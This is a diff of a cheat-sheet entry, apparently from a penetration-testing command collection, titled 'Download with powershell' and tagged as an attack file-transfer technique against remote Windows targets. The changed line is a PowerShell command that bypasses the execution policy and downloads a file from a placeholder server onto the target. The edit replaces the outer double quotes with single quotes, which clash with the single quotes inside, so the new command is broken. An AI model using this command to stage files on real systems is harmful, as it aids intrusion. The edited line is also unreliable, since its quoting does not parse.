@@ -5,7 +5,7 @@
 ## Download with powershell
 #plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
 ```powershell
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')"
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile '(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')'
 ```
 
 ## Download and execute with powershell
